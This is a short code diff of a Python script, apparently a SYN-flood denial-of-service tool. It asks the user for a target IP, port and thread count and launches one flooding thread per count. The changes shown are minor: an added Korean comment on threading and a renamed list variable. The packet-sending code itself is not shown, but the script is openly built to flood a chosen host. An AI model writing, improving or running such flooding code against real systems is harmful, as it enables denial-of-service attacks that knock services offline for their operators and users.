@@ -3,6 +3,7 @@ import string
 import threading
 
 class synflood(threading.Thread):
+    #클래스 생성시 thread로 상속받으면 이후 클래스명으로 스래드 객체 생성가능! 
     def __init__(self, ip, port):
         threading.Thread.__init__(self) # thread init
         self.ip = ip 
@@ -33,11 +34,11 @@ def main():
     port = int(input("대상 포트를 입력해 주세요 : "))
     threadNum = int(input('스레드 개수를 입력해 주세요(주의: 크면 많이 보내지만... 숫자가 너무크면 자원을 너무먹음) : '))
 
-    rthread = []
+    threadList = []
 
     for i in range(threadNum):
         i = synflood(ip,port)
-        rthread.append(i)
+        threadList.append(i)
         i.start()
 
 if __name__ == '__main__': #현재 스크립트파일이 메인으로 실행되면
